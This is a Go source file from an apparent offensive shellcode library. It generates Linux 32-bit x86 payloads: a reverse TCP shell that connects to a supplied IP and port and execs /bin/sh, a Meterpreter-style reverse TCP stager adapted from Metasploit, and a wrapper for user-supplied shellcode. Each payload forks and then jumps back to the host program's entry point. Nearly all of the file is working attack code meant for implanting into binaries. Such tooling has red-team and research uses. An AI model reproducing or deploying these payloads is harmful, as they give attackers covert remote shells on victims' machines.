package modules

import "github.com/awgh/shellcode/api"

func init() {
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"reverse_tcp_shell", reverse_tcp_shell_linux_intel_32)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"reverse_tcp_stager", reverse_tcp_stager_linux_intel_32)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"user_shellcode", user_shellcode_linux_intel_32)
}

func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.IP

	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
	//will need to put resume execution shellcode here
	shellcode1 += "\xbd"
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" +
		"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68"
		//HOST
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\x02\x00"
	//PORT
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1" +
		"\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +
		"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

	return []byte(shellcode1), nil
}

func reverse_tcp_stager_linux_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.IP

	/*
	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
	   Modified metasploit payload/linux/armle/shell/reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
	//will need to put resume execution shellcode here
	shellcode1 += "\xbd"
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80" +
		"\x97\x5b\x68"
	//HOST
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\x02\x00"
	//PORT
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe1\x6a" +
		"\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10" +
		"\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b" +
		"\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1"

	return []byte(shellcode1), nil
}

func user_shellcode_linux_intel_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	supplied_shellcode := params.ShellCode

	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
	shellcode1 += "\xbd"
	if as, err := api.PackUint32(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
